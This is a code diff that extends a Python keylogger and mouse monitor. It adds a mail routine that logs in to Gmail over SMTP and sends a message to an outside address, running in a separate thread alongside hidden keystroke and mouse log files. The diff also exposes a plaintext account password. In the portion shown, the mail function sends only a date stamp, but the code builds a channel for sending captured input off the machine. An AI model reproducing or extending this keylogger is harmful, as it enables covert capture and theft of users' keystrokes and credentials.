@@ -4,10 +4,19 @@ import time
 import threading
 import datetime
 import pynput
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.application import MIMEApplication
 
 
 
 def recordKeys():
+    with open('.keys.txt', 'w') as file:
+        logtime = f"{datetime.datetime.now().strftime("%e")}th {datetime.datetime.now().strftime("%B")}  {datetime.datetime.now().strftime("%G")}"
+        file.write(f"LOGS: {logtime} \n\n")
+
+
     while True:
         try:
             key = keyboard.read_key()
@@ -25,8 +34,11 @@ def recordKeys():
 def mouseMonitor():
     try:
         size = pyautogui.size()
+        logtime = f"{datetime.datetime.now().strftime("%e")}th {datetime.datetime.now().strftime("%B")}  {datetime.datetime.now().strftime("%G")}"
+        
         with open('.mouse.txt', 'w') as file:
-            file.write(f"Size: {size.width}x{size.height} \n")
+            file.write(f"LOGS: {logtime} \n")
+            file.write(f"Size: {size.width}x{size.height} \n\n")
         Xcopy, Ycopy = 0, 0
     except Exception as e:
             clocktime = datetime.datetime.now().strftime("%r")
@@ -60,19 +72,35 @@ def clickcheck(x, y, button, pressed, injected):
             with open(".ERRORlogs.txt", 'a') as errorfile:
                 errorfile.write(f'ERROR in Click checking: \n{e}\n\n') 
 
+
+
+def sendMails():
+    clocktime = f"{datetime.datetime.now().strftime("%e")}th {datetime.datetime.now().strftime("%B")}  {datetime.datetime.now().strftime("%G")}"
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+
+    server.login("tvboxhome00406@gmail.com", password="dzzkllpbvprpbpfm")
+    server.sendmail("tvboxhome00406@gmail.com", "dhyeylukhi95@gmail.com", msg=clocktime)
+
+
+
 if __name__ == "__main__":
     print("Hello user...")
     print("I want to record some keys from your keyboard")
+
     keyboardThread = threading.Thread(target=recordKeys)
     mouseThread = threading.Thread(target=mouseMonitor)
+    mailThread = threading.Thread(target=sendMails)
 
     keyboardThread.start()
     mouseThread.start()
+    mailThread.start()
 
     with pynput.mouse.Listener(on_click=clickcheck) as clickread:
         keyboardThread.join()
         mouseThread.join()
         clickread.join()
+        mailThread.join()
 
 
 
